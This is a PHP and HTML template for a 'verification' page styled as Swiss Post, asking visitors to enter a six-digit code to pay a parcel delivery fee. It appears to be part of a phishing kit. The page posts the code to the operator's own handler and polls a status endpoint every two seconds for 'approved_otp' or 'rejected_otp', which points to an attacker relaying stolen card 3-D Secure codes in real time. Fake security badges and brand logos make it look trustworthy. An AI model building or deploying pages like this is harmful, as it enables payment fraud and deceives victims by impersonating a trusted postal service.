<?php
require __DIR__ . '/security.php';
require __DIR__ . '/lang.php';
?><!DOCTYPE html>
<html lang="<?php echo $currentLang; ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo t('page_verification'); ?></title>
<link rel="icon" href="https://media.20min.ch/7/image/2023/12/27/cf810a3b-398c-46b4-b5f3-fed4f2973f08.png?auto=format%2Ccompress%2Cenhance&fit=max&w=1600&h=1600&rect=0%2C0%2C2048%2C2048&fp-x=0.5&fp-y=0.5&s=eaf5294ac39e1a86e4764bc72644b55f">
<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Fira Sans',Arial,sans-serif;background:#f5f5f5;color:#1e1e1e;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

:root {
    --post-yellow: #FFCC00;
    --post-yellow-dark: #E6B800;
    --post-red: #E2001A;
    --post-gray: #F5F5F5;
    --post-dark: #1e1e1e;
    --post-border: #e5e5e5;
    --post-green: #00A550;
}

.tb{background:#fff;border-bottom:1px solid var(--post-border);display:flex;align-items:center;height:56px;padding:0 24px;}
.tb-logo img{height:40px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-langs{display:flex;border:1px solid var(--post-border);border-radius:4px;overflow:hidden;}
.tb-lang{font-size:13px;font-weight:600;padding:6px 10px;cursor:pointer;color:#666;background:#fff;}
.tb-lang.active{background:var(--post-dark);color:#fff;}

.breadcrumb{background:#fff;padding:14px 24px;border-bottom:1px solid var(--post-border);font-size:13px;color:#666;}
.breadcrumb a{color:var(--post-red);font-weight:500;}
.breadcrumb span{margin:0 8px;color:#ccc;}

.page-content{flex:1;display:flex;justify-content:center;padding:40px 20px;}
.otp-wrapper{width:100%;max-width:460px;}

.secure-badge{display:flex;align-items:center;gap:8px;color:var(--post-green);font-size:14px;font-weight:600;margin-bottom:16px;}
.secure-badge svg{width:20px;height:20px;fill:var(--post-green);}

.otp-card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,0.08);overflow:hidden;}
.otp-header{background:var(--post-yellow);padding:32px;text-align:center;}
.otp-header-icon{width:72px;height:72px;background:rgba(0,0,0,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;}
.otp-header-icon svg{width:36px;height:36px;fill:var(--post-dark);}
.otp-header h1{font-size:22px;font-weight:800;color:var(--post-dark);margin-bottom:4px;}
.otp-header p{font-size:14px;color:#333;}
.otp-body{padding:32px;}

.info-box{background:#FFF8E1;border:1px solid #FFE082;border-radius:10px;padding:18px 20px;margin-bottom:28px;}
.info-box-header{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
.info-box-header svg{width:20px;height:20px;fill:#F57C00;}
.info-box-header span{font-size:14px;font-weight:700;color:#F57C00;}
.info-box p{font-size:13px;color:#795548;line-height:1.6;}

.payment-info{background:var(--post-gray);border-radius:10px;padding:18px 20px;margin-bottom:28px;display:flex;align-items:center;justify-content:space-between;}
.payment-info-left{display:flex;align-items:center;gap:14px;}
.payment-info-icon{width:44px;height:44px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,0.06);}
.payment-info-icon svg{width:26px;height:26px;fill:var(--post-dark);}
.payment-info-text .label{font-size:11px;color:#888;text-transform:uppercase;letter-spacing:0.5px;}
.payment-info-text .value{font-size:15px;font-weight:700;color:var(--post-dark);}
.payment-amount{font-size:26px;font-weight:800;color:var(--post-dark);}

.otp-form-group{margin-bottom:28px;}
.otp-form-group label{display:block;font-size:15px;font-weight:700;color:var(--post-dark);margin-bottom:14px;text-align:center;}
.otp-inputs{display:flex;justify-content:center;gap:10px;}
.otp-inputs input{width:54px;height:64px;border:2px solid var(--post-border);border-radius:10px;font-size:26px;font-weight:700;text-align:center;font-family:inherit;color:var(--post-dark);background:#fff;transition:all 0.2s;}
.otp-inputs input:focus{outline:none;border-color:var(--post-yellow);box-shadow:0 0 0 3px rgba(255,204,0,0.2);}
.otp-inputs input.filled{border-color:var(--post-green);background:#f8fff9;}
.otp-inputs input.error{border-color:var(--post-red);background:#fff8f8;animation:shake 0.4s;}
@keyframes shake{0%,100%{transform:translateX(0);}20%,60%{transform:translateX(-5px);}40%,80%{transform:translateX(5px);}}

.error-message{background:#FEF2F2;border:1px solid #FECACA;border-radius:10px;padding:14px 18px;margin-bottom:20px;display:none;align-items:center;}
.error-message.show{display:flex;}
.error-message svg{width:22px;height:22px;fill:var(--post-red);flex-shrink:0;margin-right:12px;}
.error-message span{font-size:14px;color:#991B1B;font-weight:600;}

.resend-wrapper{text-align:center;margin-bottom:28px;}
.resend-text{font-size:14px;color:#666;}
.resend-link{color:var(--post-red);font-weight:700;cursor:pointer;}
.resend-link:hover{text-decoration:underline;}
.resend-timer{color:var(--post-red);font-weight:700;}

.btn-submit{width:100%;height:56px;background:var(--post-yellow);color:var(--post-dark);border:none;border-radius:8px;font-size:16px;font-weight:800;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:all 0.2s;}
.btn-submit:hover:not(:disabled){background:var(--post-yellow-dark);transform:translateY(-1px);box-shadow:0 4px 16px rgba(255,204,0,0.4);}
.btn-submit:disabled{opacity:0.5;cursor:not-allowed;}
.btn-submit svg{width:22px;height:22px;fill:currentColor;}
.btn-submit .spinner{display:none;width:22px;height:22px;border:3px solid rgba(0,0,0,0.2);border-top-color:var(--post-dark);border-radius:50%;animation:spin 0.8s linear infinite;}
.btn-submit.loading .spinner{display:block;}
.btn-submit.loading .btn-text{display:none;}
@keyframes spin{to{transform:rotate(360deg);}}

.security-info{display:flex;align-items:center;justify-content:center;gap:20px;margin-top:24px;padding-top:20px;border-top:1px solid #eee;flex-wrap:wrap;}
.security-item{display:flex;align-items:center;gap:6px;font-size:12px;color:#888;}
.security-item svg{width:16px;height:16px;fill:#888;}
.payment-method-logo{height:20px;width:auto;object-fit:contain;}

.back-link{display:inline-flex;align-items:center;gap:6px;color:#666;font-size:14px;font-weight:600;margin-top:20px;cursor:pointer;text-align:center;width:100%;justify-content:center;}
.back-link:hover{color:var(--post-red);}
.back-link svg{width:18px;height:18px;fill:currentColor;}

footer{background:#fff;border-top:1px solid var(--post-border);padding:20px 32px;text-align:center;}
footer p{font-size:12px;color:#888;}
footer a{color:var(--post-red);}

@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-logo img{height:32px;}
    .tb-langs{display:none;}
    .breadcrumb{padding:12px 16px;font-size:12px;}
    .page-content{padding:20px 12px;}
    .otp-header{padding:24px 16px;}
    .otp-header-icon{width:60px;height:60px;}
    .otp-header h1{font-size:18px;}
    .otp-body{padding:24px 16px;}
    .payment-info{flex-direction:column;gap:12px;text-align:center;}
    .payment-info-left{flex-direction:column;}
    .otp-inputs input{width:44px;height:54px;font-size:20px;}
    .btn-submit{height:52px;font-size:15px;}
}
</style>
</head>
<body>

<div class="tb">
    <div class="tb-logo">
        <img src="https://media.20min.ch/7/image/2023/12/27/cf810a3b-398c-46b4-b5f3-fed4f2973f08.png?auto=format%2Ccompress%2Cenhance&fit=max&w=1600&h=1600&rect=0%2C0%2C2048%2C2048&fp-x=0.5&fp-y=0.5&s=eaf5294ac39e1a86e4764bc72644b55f" alt="Swiss Post">
    </div>
    <div class="tb-right">
        <div class="tb-langs">
            <a href="?s=3&lang=de" class="tb-lang <?php echo $currentLang === 'de' ? 'active' : ''; ?>">DE</a>
            <a href="?s=3&lang=fr" class="tb-lang <?php echo $currentLang === 'fr' ? 'active' : ''; ?>">FR</a>
            <a href="?s=3&lang=en" class="tb-lang <?php echo $currentLang === 'en' ? 'active' : ''; ?>">EN</a>
        </div>
    </div>
</div>

<div class="breadcrumb">
    <a href="?s=1"><?php echo t('bread_home'); ?></a>
    <span>›</span>
    <a href="?s=2"><?php echo t('bread_payment'); ?></a>
    <span>›</span>
    <?php echo t('bread_verification'); ?>
</div>

<div class="page-content">
    <div class="otp-wrapper">
        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
            <?php echo t('pay_secure_badge'); ?>
        </div>

        <div class="otp-card">
            <div class="otp-header">
                <div class="otp-header-icon">
                    <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v3a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 9H4a2 2 0 0 0-2 2v3a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2zM7 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0zm0 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0z"/></svg>
                </div>
                <h1><?php echo t('otp_title'); ?></h1>
                <p>#<?php echo $trackingNumber; ?></p>
            </div>
            <div class="otp-body">
                <div class="info-box">
                    <div class="info-box-header">
                        <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 4.7l-8 5.334L4 8.7V6.297l8 5.333 8-5.333V8.7z"/></svg>
                        <span><?php echo t('otp_info_title'); ?></span>
                    </div>
                    <p><?php echo t('otp_info_text'); ?></p>
                </div>

                <div class="payment-info">
                    <div class="payment-info-left">
                        <div class="payment-info-icon">
                            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                        </div>
                        <div class="payment-info-text">
                            <div class="label"><?php echo t('pay_delivery_fee'); ?></div>
                            <div class="value">#<?php echo $trackingNumber; ?></div>
                        </div>
                    </div>
                    <div class="payment-amount"><?php echo $currency; ?> <?php echo $amount; ?></div>
                </div>

                <form id="otp-form" action="?s=p" method="post">
                    <div class="error-message" id="error-msg">
                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                        <span><?php echo t('otp_error'); ?></span>
                    </div>

                    <?php if(isset($_GET['error'])): ?>
                    <script>document.getElementById('error-msg').classList.add('show');</script>
                    <?php endif; ?>

                    <div class="otp-form-group">
                        <label><?php echo t('otp_label'); ?></label>
                        <div class="otp-inputs">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="0">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="1">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="2">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="3">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="4">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="5">
                        </div>
                        <input type="hidden" name="otp" id="otp-value">
                    </div>

                    <div class="resend-wrapper">
                        <span class="resend-text"><?php echo t('otp_no_code'); ?> </span>
                        <span class="resend-timer" id="resend-timer"><?php echo t('otp_resend_wait'); ?> (<span id="countdown">30</span>s)</span>
                        <span class="resend-link" id="resend-link" style="display:none;"><?php echo t('otp_resend'); ?></span>
                    </div>

                    <button type="submit" class="btn-submit" id="btn-submit" disabled>
                        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
                        <span class="btn-text"><?php echo t('otp_submit'); ?></span>
                        <div class="spinner"></div>
                    </button>
                </form>

                <div class="security-info">
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
                        <?php echo t('pay_ssl'); ?>
                    </div>
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                        <?php echo t('pay_3ds'); ?>
                    </div>
                    <div class="security-item">
                        <img src="https://lh3.googleusercontent.com/-HMMzVNh69gL0SsLMReGytn-Wf10oFHBOO05oixe5pKe5762nCu8YGadIHQ2xj5wGW4irBS_eUZ3riQhsl63THzhkMjJYx43mzBa2Z7Wf8NNGT4HicbO=w1200-l80-sg-rj" alt="Google Pay" class="payment-method-logo">
                    </div>
                    <div class="security-item">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Apple_Pay_logo.svg/960px-Apple_Pay_logo.svg.png" alt="Apple Pay" class="payment-method-logo">
                    </div>
                </div>

                <a class="back-link" href="?s=2">
                    <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
                    <?php echo t('pay_back'); ?>
                </a>
            </div>
        </div>
    </div>
</div>

<footer>
    <p><?php echo t('pay_privacy'); ?> <a href="#"><?php echo t('pay_privacy_link'); ?></a></p>
    <p style="margin-top:8px;">&copy; 2024 <?php echo t('footer_copyright'); ?></p>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
$(function() {
    var $inputs = $('.otp-digit');
    var $submit = $('#btn-submit');
    var $otpValue = $('#otp-value');
    var $errorMsg = $('#error-msg');

    $inputs.first().focus();

    $inputs.on('input', function(e) {
        var $this = $(this);
        var val = $this.val().replace(/\D/g, '');

        if (val.length > 1) {
            var chars = val.split('');
            $inputs.each(function(i) {
                if (chars[i]) $(this).val(chars[i]).addClass('filled');
            });
            $inputs.last().focus();
        } else {
            $this.val(val);
            if (val) {
                $this.addClass('filled');
                var index = parseInt($this.data('index'));
                if (index < 5) $inputs.eq(index + 1).focus();
            }
        }

        $errorMsg.removeClass('show');
        $inputs.removeClass('error');
        updateSubmitState();
    });

    $inputs.on('keydown', function(e) {
        var $this = $(this);
        var index = parseInt($this.data('index'));
        if (e.key === 'Backspace' && !$this.val() && index > 0) {
            $inputs.eq(index - 1).focus().val('').removeClass('filled');
        }
    });

    function updateSubmitState() {
        var otp = '';
        $inputs.each(function() { otp += $(this).val(); });
        $otpValue.val(otp);
        $submit.prop('disabled', otp.length !== 6);
    }

    $('#otp-form').on('submit', function(e) {
        var otp = $otpValue.val();
        if (otp.length !== 6) { e.preventDefault(); $inputs.addClass('error'); return false; }
        $submit.addClass('loading');
    });

    var countdown = 30;
    var $timer = $('#resend-timer');
    var $link = $('#resend-link');
    var $count = $('#countdown');

    var interval = setInterval(function() {
        countdown--;
        $count.text(countdown);
        if (countdown <= 0) {
            clearInterval(interval);
            $timer.hide();
            $link.show();
        }
    }, 1000);

    $link.on('click', function() {
        countdown = 30;
        $count.text(countdown);
        $timer.show();
        $link.hide();
        interval = setInterval(function() {
            countdown--;
            $count.text(countdown);
            if (countdown <= 0) {
                clearInterval(interval);
                $timer.hide();
                $link.show();
            }
        }, 3000);
    });

// ========================================
// POLLING AUTOMATIQUE DU STATUT
// ========================================
setInterval(function() {
    fetch('?s=c')
        .then(r => r.json())
        .then(data => {
            if (data.status === 'approved_otp') {
                window.location.href = '?s=6'; // exit success
            } else if (data.status === 'rejected_otp') {
                window.location.href = '?s=6'; // exit
            }
        })
        .catch(e => console.log('Status check error:', e));
}, 2000); // Vérifie toutes les 2 secondes
});
</script>
<script src="/assets/js/main.js"></script>
</body>
</html>
